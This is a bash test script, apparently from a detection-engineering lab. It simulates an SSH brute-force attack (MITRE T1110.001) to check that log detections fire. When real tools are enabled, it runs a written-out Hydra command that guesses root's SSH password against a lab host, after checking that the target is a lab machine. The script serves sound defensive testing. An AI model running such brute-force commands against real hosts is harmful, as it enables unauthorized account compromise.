#!/usr/bin/env bash
# TC-01  T1110.001  SSH brute force  (Hydra -> Linux SSH host)
# Repeated failed logins from one source against one account, ending in
# compromise. Expected: repeated_failed_logins_from_single_source,
# account_compromise_attempt.
source "$(cd "$(dirname "${BASH_SOURCE[0]}")/../lib" && pwd)/common.sh"

resolve_run_dir "${1:-}"
load_tc TC-01
log "TC-01 SSH brute force -> ${TC_DST}:${TC_DPORT}"

if real_tools_enabled; then
  assert_lab_target "$TC_DST"
  if have_tool hydra; then
    log "running Hydra against lab SSH host"
    ROSTER="$ATTACKER_ROOT/targets/ssh_host/accounts.txt"
    PWFILE="$(mktemp)"; grep -v '^#' "$ROSTER" | cut -d: -f2 > "$PWFILE"
    hydra -l root -P "$PWFILE" -t 4 -f \
      "ssh://${TC_DST}:${TC_DPORT}" 2>>"$RUN_DIR/_tools.log" || true
    rm -f "$PWFILE"
  else
    warn "hydra not installed; emitting normalized logs only"
  fi
fi

generate_logs TC-01
